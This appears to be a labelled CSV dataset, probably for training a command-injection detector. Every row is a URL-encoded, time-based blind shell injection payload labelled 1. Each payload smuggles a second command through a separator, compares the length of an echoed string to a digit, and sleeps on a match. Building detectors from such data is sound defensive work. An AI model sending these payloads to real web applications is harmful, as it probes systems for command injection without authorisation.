Sentence,Label
%7C %5B 7 -ne %24%28echo CDUKUS %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1  /  / ,1
%7C %5B 8 -ne %24%28echo CDUKUS %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1  /  / ,1
%7C %5B 9 -ne %24%28echo CDUKUS %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1  /  / ,1
%26 sleep 0 %26%26 str%3D%24%28echo EHRUXO%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 1 -eq %24%7Bstr1%7D %5D %26%26 sleep 1  /  / ,1
%26 sleep 0 %26%26 str%3D%24%28echo EHRUXO%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 2 -eq %24%7Bstr1%7D %5D %26%26 sleep 1  /  / ,1
%26 sleep 0 %26%26 str%3D%24%28echo EHRUXO%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 3 -eq %24%7Bstr1%7D %5D %26%26 sleep 1  /  / ,1
%26 sleep 0 %26%26 str%3D%24%28echo EHRUXO%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 4 -eq %24%7Bstr1%7D %5D %26%26 sleep 1  /  / ,1
%26 sleep 0 %26%26 str%3D%24%28echo EHRUXO%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 5 -eq %24%7Bstr1%7D %5D %26%26 sleep 1  /  / ,1
%26 sleep 0 %26%26 str%3D%24%28echo EHRUXO%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 6 -eq %24%7Bstr1%7D %5D %26%26 sleep 1  /  / ,1
%26 sleep 0 %26%26 str%3D%24%28echo EHRUXO%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 7 -eq %24%7Bstr1%7D %5D %26%26 sleep 1  /  / ,1
%26 sleep 0 %26%26 str%3D%24%28echo EHRUXO%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 8 -eq %24%7Bstr1%7D %5D %26%26 sleep 1  /  / ,1
%26 sleep 0 %26%26 str%3D%24%28echo EHRUXO%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 9 -eq %24%7Bstr1%7D %5D %26%26 sleep 1  /  / ,1
%0A str%3D%24%28echo RCSPMW%29%0A str1%3D%24%7B%23str%7D%0A if %5B 1 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi  /  / ,1
%0A str%3D%24%28echo RCSPMW%29%0A str1%3D%24%7B%23str%7D%0A if %5B 2 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi  /  / ,1
%0A str%3D%24%28echo RCSPMW%29%0A str1%3D%24%7B%23str%7D%0A if %5B 3 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi  /  / ,1
%0A str%3D%24%28echo RCSPMW%29%0A str1%3D%24%7B%23str%7D%0A if %5B 4 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi  /  / ,1
%0A str%3D%24%28echo RCSPMW%29%0A str1%3D%24%7B%23str%7D%0A if %5B 5 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi  /  / ,1
%0A str%3D%24%28echo RCSPMW%29%0A str1%3D%24%7B%23str%7D%0A if %5B 6 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi  /  / ,1
%0A str%3D%24%28echo RCSPMW%29%0A str1%3D%24%7B%23str%7D%0A if %5B 7 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi  /  / ,1
%0A str%3D%24%28echo RCSPMW%29%0A str1%3D%24%7B%23str%7D%0A if %5B 8 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi  /  / ,1
%0A str%3D%24%28echo RCSPMW%29%0A str1%3D%24%7B%23str%7D%0A if %5B 9 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi  /  / ,1
%3B str%3D%24%28echo OHOHHT%29%3B str1%3D%24%7B%23str%7D%3B if %5B 1 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %5C%5C,1
%3B str%3D%24%28echo OHOHHT%29%3B str1%3D%24%7B%23str%7D%3B if %5B 2 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %5C%5C,1
%3B str%3D%24%28echo OHOHHT%29%3B str1%3D%24%7B%23str%7D%3B if %5B 3 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %5C%5C,1
%3B str%3D%24%28echo OHOHHT%29%3B str1%3D%24%7B%23str%7D%3B if %5B 4 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %5C%5C,1
%3B str%3D%24%28echo OHOHHT%29%3B str1%3D%24%7B%23str%7D%3B if %5B 5 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %5C%5C,1
%3B str%3D%24%28echo OHOHHT%29%3B str1%3D%24%7B%23str%7D%3B if %5B 6 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %5C%5C,1
%3B str%3D%24%28echo OHOHHT%29%3B str1%3D%24%7B%23str%7D%3B if %5B 7 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %5C%5C,1
%3B str%3D%24%28echo OHOHHT%29%3B str1%3D%24%7B%23str%7D%3B if %5B 8 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %5C%5C,1
%3B str%3D%24%28echo OHOHHT%29%3B str1%3D%24%7B%23str%7D%3B if %5B 9 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %5C%5C,1
%7C %5B 1 -ne %24%28echo JJZSID %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %5C%5C,1
%7C %5B 2 -ne %24%28echo JJZSID %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %5C%5C,1
%7C %5B 3 -ne %24%28echo JJZSID %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %5C%5C,1
%7C %5B 4 -ne %24%28echo JJZSID %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %5C%5C,1
%7C %5B 5 -ne %24%28echo JJZSID %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %5C%5C,1
%7C %5B 6 -ne %24%28echo JJZSID %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %5C%5C,1
%7C %5B 7 -ne %24%28echo JJZSID %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %5C%5C,1
%7C %5B 8 -ne %24%28echo JJZSID %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %5C%5C,1
%7C %5B 9 -ne %24%28echo JJZSID %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %5C%5C,1
%26 sleep 0 %26%26 str%3D%24%28echo TKDFPY%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 1 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %5C%5C,1
%26 sleep 0 %26%26 str%3D%24%28echo TKDFPY%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 2 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %5C%5C,1
%26 sleep 0 %26%26 str%3D%24%28echo TKDFPY%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 3 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %5C%5C,1
%26 sleep 0 %26%26 str%3D%24%28echo TKDFPY%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 4 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %5C%5C,1
%26 sleep 0 %26%26 str%3D%24%28echo TKDFPY%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 5 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %5C%5C,1
%26 sleep 0 %26%26 str%3D%24%28echo TKDFPY%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 6 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %5C%5C,1
%26 sleep 0 %26%26 str%3D%24%28echo TKDFPY%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 7 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %5C%5C,1
%26 sleep 0 %26%26 str%3D%24%28echo TKDFPY%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 8 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %5C%5C,1
%26 sleep 0 %26%26 str%3D%24%28echo TKDFPY%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 9 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %5C%5C,1
%0A str%3D%24%28echo ZDSKKE%29%0A str1%3D%24%7B%23str%7D%0A if %5B 1 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %5C%5C,1
%0A str%3D%24%28echo ZDSKKE%29%0A str1%3D%24%7B%23str%7D%0A if %5B 2 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %5C%5C,1
%0A str%3D%24%28echo ZDSKKE%29%0A str1%3D%24%7B%23str%7D%0A if %5B 3 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %5C%5C,1
%0A str%3D%24%28echo ZDSKKE%29%0A str1%3D%24%7B%23str%7D%0A if %5B 4 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %5C%5C,1
%0A str%3D%24%28echo ZDSKKE%29%0A str1%3D%24%7B%23str%7D%0A if %5B 5 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %5C%5C,1
%0A str%3D%24%28echo ZDSKKE%29%0A str1%3D%24%7B%23str%7D%0A if %5B 6 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %5C%5C,1
%0A str%3D%24%28echo ZDSKKE%29%0A str1%3D%24%7B%23str%7D%0A if %5B 7 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %5C%5C,1
%0A str%3D%24%28echo ZDSKKE%29%0A str1%3D%24%7B%23str%7D%0A if %5B 8 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %5C%5C,1
%0A str%3D%24%28echo ZDSKKE%29%0A str1%3D%24%7B%23str%7D%0A if %5B 9 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %5C%5C,1
%3B str%3D%24%28echo ZVPMJQ%29%3B str1%3D%24%7B%23str%7D%3B if %5B 1 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %26,1
%3B str%3D%24%28echo ZVPMJQ%29%3B str1%3D%24%7B%23str%7D%3B if %5B 2 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %26,1
%3B str%3D%24%28echo ZVPMJQ%29%3B str1%3D%24%7B%23str%7D%3B if %5B 3 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %26,1
%3B str%3D%24%28echo ZVPMJQ%29%3B str1%3D%24%7B%23str%7D%3B if %5B 4 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %26,1
%3B str%3D%24%28echo ZVPMJQ%29%3B str1%3D%24%7B%23str%7D%3B if %5B 5 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %26,1
%3B str%3D%24%28echo ZVPMJQ%29%3B str1%3D%24%7B%23str%7D%3B if %5B 6 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %26,1
%3B str%3D%24%28echo ZVPMJQ%29%3B str1%3D%24%7B%23str%7D%3B if %5B 7 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %26,1
%3B str%3D%24%28echo ZVPMJQ%29%3B str1%3D%24%7B%23str%7D%3B if %5B 8 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %26,1
%3B str%3D%24%28echo ZVPMJQ%29%3B str1%3D%24%7B%23str%7D%3B if %5B 9 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %26,1
%7C %5B 1 -ne %24%28echo HZZOKR %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %26,1
%7C %5B 2 -ne %24%28echo HZZOKR %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %26,1
%7C %5B 3 -ne %24%28echo HZZOKR %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %26,1
%7C %5B 4 -ne %24%28echo HZZOKR %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %26,1
%7C %5B 5 -ne %24%28echo HZZOKR %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %26,1
%7C %5B 6 -ne %24%28echo HZZOKR %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %26,1
%7C %5B 7 -ne %24%28echo HZZOKR %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %26,1
%7C %5B 8 -ne %24%28echo HZZOKR %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %26,1
%7C %5B 9 -ne %24%28echo HZZOKR %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %26,1
%26 sleep 0 %26%26 str%3D%24%28echo HIXNBS%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 1 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %26,1
%26 sleep 0 %26%26 str%3D%24%28echo HIXNBS%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 2 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %26,1
%26 sleep 0 %26%26 str%3D%24%28echo HIXNBS%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 3 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %26,1
%26 sleep 0 %26%26 str%3D%24%28echo HIXNBS%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 4 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %26,1
%26 sleep 0 %26%26 str%3D%24%28echo HIXNBS%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 5 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %26,1
%26 sleep 0 %26%26 str%3D%24%28echo HIXNBS%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 6 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %26,1
%26 sleep 0 %26%26 str%3D%24%28echo HIXNBS%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 7 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %26,1
%26 sleep 0 %26%26 str%3D%24%28echo HIXNBS%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 8 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %26,1
%26 sleep 0 %26%26 str%3D%24%28echo HIXNBS%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 9 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %26,1
%0A str%3D%24%28echo WBNIBQ%29%0A str1%3D%24%7B%23str%7D%0A if %5B 1 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %26,1
%0A str%3D%24%28echo WBNIBQ%29%0A str1%3D%24%7B%23str%7D%0A if %5B 2 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %26,1
%0A str%3D%24%28echo WBNIBQ%29%0A str1%3D%24%7B%23str%7D%0A if %5B 3 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %26,1
%0A str%3D%24%28echo WBNIBQ%29%0A str1%3D%24%7B%23str%7D%0A if %5B 4 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %26,1
%0A str%3D%24%28echo WBNIBQ%29%0A str1%3D%24%7B%23str%7D%0A if %5B 5 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %26,1
%0A str%3D%24%28echo WBNIBQ%29%0A str1%3D%24%7B%23str%7D%0A if %5B 6 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %26,1
%0A str%3D%24%28echo WBNIBQ%29%0A str1%3D%24%7B%23str%7D%0A if %5B 7 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %26,1
%0A str%3D%24%28echo WBNIBQ%29%0A str1%3D%24%7B%23str%7D%0A if %5B 8 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %26,1
%0A str%3D%24%28echo WBNIBQ%29%0A str1%3D%24%7B%23str%7D%0A if %5B 9 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %26,1
%3B str%3D%24%28echo ZNGHTM%29%3B str1%3D%24%7B%23str%7D%3B if %5B 1 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %7C,1
%3B str%3D%24%28echo ZNGHTM%29%3B str1%3D%24%7B%23str%7D%3B if %5B 2 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %7C,1
%3B str%3D%24%28echo ZNGHTM%29%3B str1%3D%24%7B%23str%7D%3B if %5B 3 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %7C,1
%3B str%3D%24%28echo ZNGHTM%29%3B str1%3D%24%7B%23str%7D%3B if %5B 4 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %7C,1
%3B str%3D%24%28echo ZNGHTM%29%3B str1%3D%24%7B%23str%7D%3B if %5B 5 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %7C,1
%3B str%3D%24%28echo ZNGHTM%29%3B str1%3D%24%7B%23str%7D%3B if %5B 6 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %7C,1
%3B str%3D%24%28echo ZNGHTM%29%3B str1%3D%24%7B%23str%7D%3B if %5B 7 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %7C,1
%3B str%3D%24%28echo ZNGHTM%29%3B str1%3D%24%7B%23str%7D%3B if %5B 8 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %7C,1
%3B str%3D%24%28echo ZNGHTM%29%3B str1%3D%24%7B%23str%7D%3B if %5B 9 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %7C,1
%7C %5B 1 -ne %24%28echo CSMWFN %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %7C,1
%7C %5B 2 -ne %24%28echo CSMWFN %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %7C,1
%7C %5B 3 -ne %24%28echo CSMWFN %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %7C,1
%7C %5B 4 -ne %24%28echo CSMWFN %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %7C,1
%7C %5B 5 -ne %24%28echo CSMWFN %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %7C,1
%7C %5B 6 -ne %24%28echo CSMWFN %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %7C,1
%7C %5B 7 -ne %24%28echo CSMWFN %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %7C,1
%7C %5B 8 -ne %24%28echo CSMWFN %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %7C,1
%7C %5B 9 -ne %24%28echo CSMWFN %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %7C,1
%26 sleep 0 %26%26 str%3D%24%28echo XBWWVF%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 1 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %7C,1
%26 sleep 0 %26%26 str%3D%24%28echo XBWWVF%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 2 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %7C,1
%26 sleep 0 %26%26 str%3D%24%28echo XBWWVF%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 3 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %7C,1
%26 sleep 0 %26%26 str%3D%24%28echo XBWWVF%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 4 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %7C,1
%26 sleep 0 %26%26 str%3D%24%28echo XBWWVF%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 5 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %7C,1
%26 sleep 0 %26%26 str%3D%24%28echo XBWWVF%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 6 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %7C,1
%26 sleep 0 %26%26 str%3D%24%28echo XBWWVF%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 7 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %7C,1
%26 sleep 0 %26%26 str%3D%24%28echo XBWWVF%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 8 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %7C,1
%26 sleep 0 %26%26 str%3D%24%28echo XBWWVF%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 9 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %7C,1
%0A str%3D%24%28echo KEZMWT%29%0A str1%3D%24%7B%23str%7D%0A if %5B 1 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %7C,1
%0A str%3D%24%28echo KEZMWT%29%0A str1%3D%24%7B%23str%7D%0A if %5B 2 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %7C,1
%0A str%3D%24%28echo KEZMWT%29%0A str1%3D%24%7B%23str%7D%0A if %5B 3 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %7C,1
%0A str%3D%24%28echo KEZMWT%29%0A str1%3D%24%7B%23str%7D%0A if %5B 4 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %7C,1
%0A str%3D%24%28echo KEZMWT%29%0A str1%3D%24%7B%23str%7D%0A if %5B 5 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %7C,1
%0A str%3D%24%28echo KEZMWT%29%0A str1%3D%24%7B%23str%7D%0A if %5B 6 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %7C,1
%0A str%3D%24%28echo KEZMWT%29%0A str1%3D%24%7B%23str%7D%0A if %5B 7 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %7C,1
%0A str%3D%24%28echo KEZMWT%29%0A str1%3D%24%7B%23str%7D%0A if %5B 8 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %7C,1
%0A str%3D%24%28echo KEZMWT%29%0A str1%3D%24%7B%23str%7D%0A if %5B 9 -ne %24%7Bstr1%7D %5D%0A then sleep 0%0A else sleep 1%0A fi %7C,1
%3B str%3D%24%28echo CHSJVY%29%3B str1%3D%24%7B%23str%7D%3B if %5B 1 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %2527,1
%3B str%3D%24%28echo CHSJVY%29%3B str1%3D%24%7B%23str%7D%3B if %5B 2 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %2527,1
%3B str%3D%24%28echo CHSJVY%29%3B str1%3D%24%7B%23str%7D%3B if %5B 3 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %2527,1
%3B str%3D%24%28echo CHSJVY%29%3B str1%3D%24%7B%23str%7D%3B if %5B 4 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %2527,1
%3B str%3D%24%28echo CHSJVY%29%3B str1%3D%24%7B%23str%7D%3B if %5B 5 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %2527,1
%3B str%3D%24%28echo CHSJVY%29%3B str1%3D%24%7B%23str%7D%3B if %5B 6 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %2527,1
%3B str%3D%24%28echo CHSJVY%29%3B str1%3D%24%7B%23str%7D%3B if %5B 7 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %2527,1
%3B str%3D%24%28echo CHSJVY%29%3B str1%3D%24%7B%23str%7D%3B if %5B 8 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %2527,1
%3B str%3D%24%28echo CHSJVY%29%3B str1%3D%24%7B%23str%7D%3B if %5B 9 -ne %24%7Bstr1%7D %5D%3B then sleep 0%3B else sleep 1%3B fi %2527,1
%7C %5B 1 -ne %24%28echo FYXPMZ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %2527,1
%7C %5B 2 -ne %24%28echo FYXPMZ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %2527,1
%7C %5B 3 -ne %24%28echo FYXPMZ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %2527,1
%7C %5B 4 -ne %24%28echo FYXPMZ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %2527,1
%7C %5B 5 -ne %24%28echo FYXPMZ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %2527,1
%7C %5B 6 -ne %24%28echo FYXPMZ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %2527,1
%7C %5B 7 -ne %24%28echo FYXPMZ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %2527,1
%7C %5B 8 -ne %24%28echo FYXPMZ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %2527,1
%7C %5B 9 -ne %24%28echo FYXPMZ %7C tr -d %27%5Cn%27 %7C wc -c%29 %5D %7C%7C sleep 1 %2527,1
%26 sleep 0 %26%26 str%3D%24%28echo AYBJIV%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 1 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %2527,1
%26 sleep 0 %26%26 str%3D%24%28echo AYBJIV%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 2 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %2527,1
%26 sleep 0 %26%26 str%3D%24%28echo AYBJIV%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 3 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %2527,1
%26 sleep 0 %26%26 str%3D%24%28echo AYBJIV%29 %26%26 str1%3D%24%7B%23str%7D %26%26 %5B 4 -eq %24%7Bstr1%7D %5D %26%26 sleep 1 %2527,1
